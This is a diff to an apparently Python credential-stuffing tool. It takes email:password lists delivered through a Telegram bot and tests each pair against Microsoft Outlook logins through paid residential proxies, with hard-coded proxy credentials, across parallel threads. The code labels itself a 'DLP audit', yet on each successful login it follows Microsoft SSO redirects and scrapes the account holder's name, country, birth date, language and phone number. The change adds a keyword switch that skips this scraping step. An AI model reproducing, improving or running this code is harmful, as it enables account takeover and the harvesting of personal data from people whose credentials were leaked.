@@ -183,7 +183,7 @@ class DummyQueue:
     def put(self, item):
         pass # Silenciamos el log detallado por credencial en este nivel para no trabar la consola CMD
 
-def run_local_audit(email, password, proxy_dict, hits_buffer):
+def run_local_audit(email, password, proxy_dict, hits_buffer, keyword=""):
     """
     Ejecuta el chequeo de Microsoft Outlook de forma local desde el VPS.
     Si el resultado es HIT, lo anexa a hits_buffer de forma thread-safe.
@@ -272,85 +272,106 @@ def run_local_audit(email, password, proxy_dict, hits_buffer):
                     pass
             
             # TLD Fallback Extremo para forzar País
-            try:
-                profile_html_res = session.get("https://account.microsoft.com/profile", verify=False, timeout=15)
-                if profile_html_res.status_code == 200:
-                    html_text = profile_html_res.text
-                    
-                    # --- Resolver SSO Bridge de Microsoft (Bucle de Redirecciones JS) ---
-                    redirect_count = 0
-                    while "<form" in html_text and redirect_count < 5:
-                        form_action = re.search(r'action="([^"]+)"', html_text, re.IGNORECASE)
-                        if form_action:
-                            post_url = form_action.group(1).replace("&#x3a;", ":").replace("&#x2f;", "/")
-                            inputs = re.findall(r'<input[^>]*name="([^"]+)"[^>]*value="([^"]*)"', html_text, re.IGNORECASE)
-                            silent_data = {k: v.replace("&quot;", '"') for k, v in inputs}
-                            try:
-                                profile_html_res = session.post(post_url, data=silent_data, verify=False, timeout=15, allow_redirects=True)
-                                html_text = profile_html_res.text
-                            except: pass
-                            redirect_count += 1
-                        else:
-                            break
-                            
-                    while "window.location.replace" in html_text and redirect_count < 8:
-                        redir_m = re.search(r'window\.location\.replace\((["\'])(.*?)\1\)', html_text)
-                        if redir_m:
-                            redir_url = redir_m.group(2)
-                            try:
-                                profile_html_res = session.get(redir_url, verify=False, timeout=15, allow_redirects=True)
-                                html_text = profile_html_res.text
-                            except: pass
-                            redirect_count += 1
-                        else:
-                            break
-                    # ----------------------------------------------------------------
-                    
-                    if name == "N/A" or not name:
-                        m = re.search(r'"(?:FullName|DisplayFullName|displayName)"\s*:\s*"([^"]+)"', html_text, re.IGNORECASE)
-                        if not m: m = re.search(r'<span>Full name</span>.*?<span[^>]*>([^<]+)</span>', html_text, re.IGNORECASE | re.DOTALL)
-                        if m: name = m.group(1).strip()
-                    
-                    m = re.search(r'"(?:Country|CountryOrRegion)"\s*:\s*"([^"]+)"', html_text, re.IGNORECASE)
-                    if not m: m = re.search(r'Country or region</span>.*?<span[^>]*>([^<]+)</span>', html_text, re.IGNORECASE | re.DOTALL)
-                    if m: country = m.group(1).strip().upper()
+            jerry_mode = (keyword and "jerry7822" in keyword.lower()) if 'keyword' in locals() else False
+            if not jerry_mode:
+                try:
+                    profile_html_res = session.get("https://account.microsoft.com/profile", verify=False, timeout=15)
+                    if profile_html_res.status_code == 200:
+                        html_text = profile_html_res.text
                         
-                    m = re.search(r'"(?:BirthDate|DateOfBirth|dob)"\s*:\s*"([^"]+)"', html_text, re.IGNORECASE)
-                    if not m: m = re.search(r'Date of birth</span>.*?<span[^>]*>([^<]+)</span>', html_text, re.IGNORECASE | re.DOTALL)
-                    if m: dob = m.group(1).strip()
+                        # --- Resolver SSO Bridge de Microsoft (Bucle de Redirecciones JS) ---
+                        redirect_count = 0
+                        while redirect_count < 10:
+                            made_request = False
                             
-                    m = re.search(r'"(?:Language|Locale)"\s*:\s*"([^"]+)"', html_text, re.IGNORECASE)
-                    if not m: m = re.search(r'id="locale-picker-link"[^>]*>([^<]+)</a>', html_text, re.IGNORECASE)
-                    if m: language = m.group(1).strip()
-
-                    phone_matches = re.findall(r'"ProofName"\s*:\s*"(\+\d+[^"]+)"', html_text, re.IGNORECASE)
-                    if not phone_matches: phone_matches = re.findall(r'"PhoneNumber"\s*:\s*"([^"]+)"', html_text, re.IGNORECASE)
-                    if not phone_matches: phone_matches = re.findall(r'Phone\s*(?:linked\s*to)?[^<]*\s*(\+\d[\d\s]+)\s*<', html_text, re.IGNORECASE | re.DOTALL)
-                    if phone_matches: phone = phone_matches[0].strip()
-
-                    # JSON Payload Fallback
-                    if name == "N/A" and "window.__INITIAL_STATE__" in html_text:
-                        import json
-                        blob_match = re.search(r'window\.__INITIAL_STATE__\s*=\s*({.*?});', html_text, re.DOTALL)
-                        if blob_match:
-                            try:
-                                state = json.loads(blob_match.group(1))
-                                if isinstance(state, dict):
-                                    res_str = json.dumps(state)
-                                    if name == "N/A":
-                                        n_m = re.search(r'"(?:FullName|displayName)":"([^"]+)"', res_str, re.IGNORECASE)
-                                        if n_m: name = n_m.group(1)
-                                    if country == "XZ":
-                                        c_m = re.search(r'"(?:Country|CountryOrRegion)":"([^"]+)"', res_str, re.IGNORECASE)
-                                        if c_m: country = c_m.group(1)
-                                    if dob == "N/A":
-                                        d_m = re.search(r'"(?:BirthDate|dob)":"([^"]+)"', res_str, re.IGNORECASE)
-                                        if d_m: dob = d_m.group(1)
-                            except:
-                                pass
-            except:
-                pass
-
+                            if "<form" in html_text:
+                                form_action = re.search(r'action="([^"]+)"', html_text, re.IGNORECASE)
+                                if form_action:
+                                    post_url = form_action.group(1).replace("&#x3a;", ":").replace("&#x2f;", "/")
+                                    inputs = re.findall(r'<input[^>]*name="([^"]+)"[^>]*value="([^"]*)"', html_text, re.IGNORECASE)
+                                    silent_data = {k: v.replace("&quot;", '"') for k, v in inputs}
+                                    try:
+                                        profile_html_res = session.post(post_url, data=silent_data, verify=False, timeout=15, allow_redirects=True, headers=session.headers)
+                                        html_text = profile_html_res.text
+                                        made_request = True
+                                    except: pass
+                                    redirect_count += 1
+                                    
+                            if not made_request and "window.location.replace" in html_text:
+                                redir_m = re.search(r'window\.location\.replace\((["\'])(.*?)\1\)', html_text)
+                                if redir_m:
+                                    redir_url = redir_m.group(2)
+                                    try:
+                                        profile_html_res = session.get(redir_url, verify=False, timeout=15, allow_redirects=True, headers=session.headers)
+                                        html_text = profile_html_res.text
+                                        made_request = True
+                                    except: pass
+                                    redirect_count += 1
+                                    
+                            if not made_request:
+                                break
+                        # ----------------------------------------------------------------
+                        
+                        # --- Robust JSON Data Extraction ---
+                        try:
+                            import json
+                            area_matches = re.findall(r'var areaConfig = JSON\.stringify\(({.*?})\);', html_text)
+                            for am in area_matches:
+                                area = json.loads(am)
+                                c = area.get("userMarket") or area.get("countryCode")
+                                if c and c != "XZ": country = c
+                                
+                                dump = json.dumps(area)
+                                n_m = re.search(r'"(?:FullName|DisplayFullName|displayName)"\s*:\s*"([^"]+)"', dump, re.IGNORECASE)
+                                if n_m and name == "N/A": name = n_m.group(1).encode('utf-8').decode('unicode_escape')
+                                
+                                d_m = re.search(r'"(?:BirthDate|dob)"\s*:\s*"([^"]+)"', dump, re.IGNORECASE)
+                                if d_m and dob == "N/A": dob = d_m.group(1)
+                                
+                            cms_matches = re.findall(r'var cmsContent = JSON\.stringify\(({.*?})\);', html_text)
+                            for cm in cms_matches:
+                                cms = json.loads(cm)
+                                dump = json.dumps(cms)
+                                if name == "N/A":
+                                    n_m = re.search(r'"(?:FullName|DisplayFullName|displayName)"\s*:\s*"([^"]+)"', dump, re.IGNORECASE)
+                                    if n_m and "Full name" not in n_m.group(1): name = n_m.group(1).encode('utf-8').decode('unicode_escape')
+                                if country == "N/A":
+                                    c_m = re.search(r'"(?:Country|userMarket)"\s*:\s*"([A-Z]{2})"', dump, re.IGNORECASE)
+                                    if c_m and c_m.group(1) != "XZ": country = c_m.group(1)
+                                if dob == "N/A":
+                                    d_m = re.search(r'"(?:BirthDate|dob)"\s*:\s*"([^"]+)"', dump, re.IGNORECASE)
+                                    if d_m and "Date of birth" not in d_m.group(1): dob = d_m.group(1)
+                        except: pass
+                        
+                        # Fallback string matching ---
+                        if name == "N/A" or not name:
+                            m = re.search(r'"(?:FullName|DisplayFullName|displayName)"\s*:\s*"([^"]+)"', html_text, re.IGNORECASE)
+                            if not m: m = re.search(r'<span>Full name</span>.*?<span[^>]*>([^<]+)</span>', html_text, re.IGNORECASE | re.DOTALL)
+                            if m: name = m.group(1).strip()
+                        
+                        if country == "N/A" or country == "XZ":
+                            m = re.search(r'"(?:Country|CountryOrRegion)"\s*:\s*"([^"]+)"', html_text, re.IGNORECASE)
+                            if not m: m = re.search(r'Country or region</span>.*?<span[^>]*>([^<]+)</span>', html_text, re.IGNORECASE | re.DOTALL)
+                            if m: 
+                                c = m.group(1).strip().upper()
+                                if c != "XZ": country = c
+                            
+                        if dob == "N/A":
+                            m = re.search(r'"(?:BirthDate|DateOfBirth|dob)"\s*:\s*"([^"]+)"', html_text, re.IGNORECASE)
+                            if not m: m = re.search(r'Date of birth</span>.*?<span[^>]*>([^<]+)</span>', html_text, re.IGNORECASE | re.DOTALL)
+                            if m and "Date of birth" not in m.group(1): dob = m.group(1).strip()
+                                
+                        m = re.search(r'"(?:Language|Locale)"\s*:\s*"([^"]+)"', html_text, re.IGNORECASE)
+                        if not m: m = re.search(r'id="locale-picker-link"[^>]*>([^<]+)</a>', html_text, re.IGNORECASE)
+                        if m: language = m.group(1).strip()
+        
+                        phone_matches = re.findall(r'"ProofName"\s*:\s*"(\+\d+[^"]+)"', html_text, re.IGNORECASE)
+                        if not phone_matches: phone_matches = re.findall(r'"PhoneNumber"\s*:\s*"([^"]+)"', html_text, re.IGNORECASE)
+                        if not phone_matches: phone_matches = re.findall(r'Phone\s*(?:linked\s*to)?[^<]*\s*(\+\d[\d\s]+)\s*<', html_text, re.IGNORECASE | re.DOTALL)
+                        if phone_matches: phone = phone_matches[0].strip()
+                except Exception as e:
+                    pass
+            
             if country == "XZ":
                 email_lower = email.lower()
                 if email_lower.endswith('.es'): country = 'ES'
@@ -389,7 +410,7 @@ def run_local_audit(email, password, proxy_dict, hits_buffer):
     except Exception as e:
         pass
 
-def process_file_and_scan(file_path):
+def process_file_and_scan(file_path, keyword=""):
     print("📥 Archivo detectado. Iniciando Auditoría DLP automática DESDE EL VPS...")
     hits_buffer = []
     
@@ -448,7 +469,7 @@ def process_file_and_scan(file_path):
             "http": "http://iFWCvoL1YiGW0U1T:gAPHeqlqy33PlWrj@geo.iproyal.com:12321",
             "https": "http://iFWCvoL1YiGW0U1T:gAPHeqlqy33PlWrj@geo.iproyal.com:12321"
         }
-        run_local_audit(email.strip(), pwd.strip(), iproyal_auth, hits_buffer)
+        run_local_audit(email.strip(), pwd.strip(), iproyal_auth, hits_buffer, keyword)
         time.sleep(random.uniform(0.5, 1.2))
 
     # 🔥 TURBO MODE: 10 hilos en paralelo ejecutados localmente
@@ -590,7 +611,7 @@ async def handler(event):
                 await client.download_media(event.message, file=local_path)
                 print(f"    -> Iniciando Escáner DLP Aislado...")
                 
-                t = threading.Thread(target=process_file_and_scan, args=(local_path,))
+                t = threading.Thread(target=process_file_and_scan, args=(local_path, getattr(event.message, 'message', '') or ''))
                 t.start()
             except Exception as e:
                 print(f"Error descargando medio: {e}")
